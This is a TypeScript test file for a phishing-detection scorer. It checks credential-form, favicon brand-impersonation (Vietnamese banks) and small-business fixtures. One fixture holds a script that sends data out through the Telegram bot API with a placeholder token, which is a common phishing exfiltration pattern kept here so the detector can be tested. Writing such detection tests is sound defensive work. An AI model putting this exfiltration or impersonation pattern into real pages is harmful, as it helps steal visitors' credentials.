import { analyzeHtml, type HtmlEvidence, type SiteEvidence } from '../server/evidence.ts';
import { scoreEvidence } from '../server/riskScoring.ts';
import { getDomainParts } from '../server/domainRules.ts';

console.log('=== TEST 1: Image-dominant Phishing Detection ===');
const imagePhishingHtml = `
<!DOCTYPE html>
<html>
<head><title>Sign in to your account</title></head>
<body>
  <img src="https://images.example.com/login-bg.png" alt="Login Background" width="800" height="600" />
  <form action="/login" method="POST">
    <input type="text" name="username" placeholder="Username" />
    <input type="password" name="password" placeholder="Password" />
    <button type="submit">Sign In</button>
  </form>
</body>
</html>
`;
const analyzedImage = analyzeHtml(imagePhishingHtml, 'https://secure-login-portal-xyz.xyz/login', 'secure-login-portal-xyz.xyz');
console.log('imageDominantForm:', analyzedImage.imageDominantForm);
if (!analyzedImage.imageDominantForm) {
  console.error('FAIL: Expected imageDominantForm to be true');
  process.exit(1);
}

const mockEvidenceImage: SiteEvidence = {
  url: 'https://secure-login-portal-xyz.xyz/login',
  finalUrl: null,
  domain: getDomainParts('secure-login-portal-xyz.xyz'),
  finalDomain: null,
  dns: { ip: '1.2.3.4', nxdomain: false, privateResolution: false },
  tls: { ok: true, authorized: true, authorizationError: null, protocol: 'TLSv1.3', issuer: "Let's Encrypt", validFrom: null, validTo: null, certAgeDays: 2, daysRemaining: 88 },
  http: { status: 200, usedHttps: true, hsts: false, csp: false, fetchError: null },
  html: analyzedImage,
  popularityRank: null,
  finalPopularityRank: null,
  urlModelProbability: 0.96,
  finalUrlModelProbability: null,
  domainAge: { registeredAt: '2026-11-01', ageDays: 5, registrar: 'Namecheap' },
  threatListings: [],
  shopPages: null,
  collectedMs: 15,
};
const scoreImage = scoreEvidence(mockEvidenceImage);
console.log('Image phishing score:', scoreImage.score, 'status:', scoreImage.status, 'verdict:', scoreImage.verdict);
console.log('Factors:', scoreImage.factors.map(f => `${f.id} (${f.delta})`).join(', '));
if (scoreImage.score > 25 || scoreImage.status !== 'Dangerous') {
  console.error('FAIL: Expected image phishing to be Dangerous with score <= 25');
  process.exit(1);
}

console.log('\n=== TEST 2: Favicon Brand Impersonation ===');
const faviconHtml = `
<!DOCTYPE html>
<html>
<head>
  <title>Customer Portal</title>
  <link rel="icon" href="https://www.vietcombank.com.vn/favicon.ico" />
</head>
<body>
  <h1>Welcome</h1>
</body>
</html>
`;
const analyzedFavicon = analyzeHtml(faviconHtml, 'https://vcb-customer-verify.top', 'vcb-customer-verify.top');
console.log('faviconBrand:', analyzedFavicon.faviconBrand);
if (analyzedFavicon.faviconBrand !== 'vietcombank') {
  console.error('FAIL: Expected faviconBrand to be vietcombank, got:', analyzedFavicon.faviconBrand);
  process.exit(1);
}

const mockEvidenceFavicon: SiteEvidence = {
  url: 'https://vcb-customer-verify.top',
  finalUrl: null,
  domain: getDomainParts('vcb-customer-verify.top'),
  finalDomain: null,
  dns: { ip: '1.2.3.4', nxdomain: false, privateResolution: false },
  tls: { ok: true, authorized: true, authorizationError: null, protocol: 'TLSv1.3', issuer: "Let's Encrypt", validFrom: null, validTo: null, certAgeDays: 3, daysRemaining: 87 },
  http: { status: 200, usedHttps: true, hsts: false, csp: false, fetchError: null },
  html: analyzedFavicon,
  popularityRank: null,
  finalPopularityRank: null,
  urlModelProbability: 0.88,
  finalUrlModelProbability: null,
  domainAge: { registeredAt: '2026-11-01', ageDays: 6, registrar: 'Namecheap' },
  threatListings: [],
  shopPages: null,
  collectedMs: 15,
};
const scoreFavicon = scoreEvidence(mockEvidenceFavicon);
console.log('Favicon score:', scoreFavicon.score, 'status:', scoreFavicon.status, 'verdict:', scoreFavicon.verdict);
if (scoreFavicon.score > 20 || scoreFavicon.status !== 'Dangerous') {
  console.error('FAIL: Expected favicon impersonation to be Dangerous with score <= 20');
  process.exit(1);
}

console.log('\n=== TEST 2b: Favicon trên CDN dùng chung không bị coi là giả mạo (hồi quy phongvu.vn) ===');
for (const [label, href, page, expected] of [
  ['CDN Google (phongvu.vn)', 'https://lh3.googleusercontent.com/A0exvuDoHpF2iQO2yxX7XfS6d4Zfie=w32', 'https://phongvu.vn/', null],
  ['CDN GitHub', 'https://raw.githubusercontent.com/acme/site/main/favicon.png', 'https://acme-shop.vn/', null],
  ['CDN Cloudflare', 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/icon.png', 'https://shopnho.vn/', null],
  ['Tên thương hiệu trong đường dẫn', 'https://cdn.example.net/img/vietcombank-logo.ico', 'https://vcb-verify.top/', 'vietcombank'],
  ['Hotlink từ site chính thức', 'https://www.techcombank.com.vn/favicon.ico', 'https://tcb-login.xyz/', 'techcombank'],
] as const) {
  const got = analyzeHtml(`<html><head><title>Trang</title><link rel="icon" href="${href}"></head><body>Xin chào</body></html>`, page, new URL(page).hostname.replace(/^www\./, '')).faviconBrand;
  console.log(`${label}: faviconBrand=${got}`);
  if (got !== expected) {
    console.error(`FAIL: ${label} - mong đợi ${expected}, nhận ${got}`);
    process.exit(1);
  }
}

console.log('\n=== TEST 3: SPA with Telegram Exfiltration ===');
const spaTelegramHtml = `
<!DOCTYPE html>
<html>
<head><title>Crypto Rewards</title></head>
<body>
  <div id="root"></div>
  <script>
    const BOT_TOKEN = "123456:ABC-DEF";
    function sendLog(data) {
      fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=123&text=' + encodeURIComponent(data));
    }
  </script>
</body>
</html>
`;
const analyzedSpa = analyzeHtml(spaTelegramHtml, 'https://claim-airdrop-sol.xyz', 'claim-airdrop-sol.xyz');
console.log('isSpa:', analyzedSpa.isSpa, 'telegramExfil:', analyzedSpa.telegramExfiltration);
if (!analyzedSpa.isSpa || !analyzedSpa.telegramExfiltration) {
  console.error('FAIL: Expected isSpa=true and telegramExfil=true');
  process.exit(1);
}

const mockEvidenceSpa: SiteEvidence = {
  url: 'https://claim-airdrop-sol.xyz',
  finalUrl: null,
  domain: getDomainParts('claim-airdrop-sol.xyz'),
  finalDomain: null,
  dns: { ip: '1.2.3.4', nxdomain: false, privateResolution: false },
  tls: { ok: true, authorized: true, authorizationError: null, protocol: 'TLSv1.3', issuer: "Let's Encrypt", validFrom: null, validTo: null, certAgeDays: 1, daysRemaining: 89 },
  http: { status: 200, usedHttps: true, hsts: false, csp: false, fetchError: null },
  html: analyzedSpa,
  popularityRank: null,
  finalPopularityRank: null,
  urlModelProbability: 0.85,
  finalUrlModelProbability: null,
  domainAge: { registeredAt: '2026-11-05', ageDays: 2, registrar: 'Namecheap' },
  threatListings: [],
  shopPages: null,
  collectedMs: 15,
};
const scoreSpa = scoreEvidence(mockEvidenceSpa);
console.log('SPA Telegram score:', scoreSpa.score, 'status:', scoreSpa.status, 'verdict:', scoreSpa.verdict);
if (scoreSpa.score > 20 || scoreSpa.status !== 'Dangerous') {
  console.error('FAIL: Expected SPA Telegram exfiltration to be Dangerous');
  process.exit(1);
}

console.log('\n=== TEST 4: SMB Transparency Shield ===');
const smbHtml = `
<!DOCTYPE html>
<html>
<head><title>Blackmore & Roy - Sewing Machines Perth</title></head>
<body>
  <h1>Blackmore & Roy Sewing Machine Specialists</h1>
  <p>Providing sewing machine sales, repairs and service across Western Australia since 1986.</p>
  <p>Visit our showroom or call us today.</p>
  <footer>
    <p>ABN / Company Registration: 84 009 234 567 | Hotline: +61 8 9451 2727</p>
    <a href="/privacy-policy">Privacy Policy</a> | <a href="/terms">Terms of Service</a>
  </footer>
</body>
</html>
`;
const analyzedSmb = analyzeHtml(smbHtml, 'https://blackmoreandroy.com.au', 'blackmoreandroy.com.au');
console.log('SMB taxId:', analyzedSmb.taxId, 'contactInfo:', analyzedSmb.contactInfo, 'policyLinks:', analyzedSmb.policyLinks);

const mockEvidenceSmb: SiteEvidence = {
  url: 'https://blackmoreandroy.com.au',
  finalUrl: null,
  domain: getDomainParts('blackmoreandroy.com.au'),
  finalDomain: null,
  dns: { ip: '103.27.34.12', nxdomain: false, privateResolution: false },
  tls: { ok: true, authorized: true, authorizationError: null, protocol: 'TLSv1.3', issuer: "Sectigo RSA Domain Validation CA", validFrom: null, validTo: null, certAgeDays: 45, daysRemaining: 320 },
  http: { status: 200, usedHttps: true, hsts: true, csp: false, fetchError: null },
  html: analyzedSmb,
  popularityRank: null, // Young or local Australian business not in global top 200k
  finalPopularityRank: null,
  urlModelProbability: 0.05,
  finalUrlModelProbability: null,
  domainAge: { registeredAt: '2026-06-01', ageDays: 155, registrar: 'TUCOWS' }, // Domain under 6 months (-22 penalty)
  threatListings: [],
  shopPages: null,
  collectedMs: 15,
};
const scoreSmb = scoreEvidence(mockEvidenceSmb);
console.log('SMB score:', scoreSmb.score, 'status:', scoreSmb.status, 'floor:', scoreSmb.floor, 'verdict:', scoreSmb.verdict);
console.log('Factors:', scoreSmb.factors.map(f => `${f.id} (${f.delta > 0 ? '+' : ''}${f.delta})`).join(', '));
if (scoreSmb.score < 65 || scoreSmb.status === 'Dangerous') {
  console.error('FAIL: Expected SMB to be protected by Transparency Shield (score >= 65, not Dangerous)');
  process.exit(1);
}

console.log('\n=== ALL 4 TESTS PASSED FLAWLESSLY! ===');
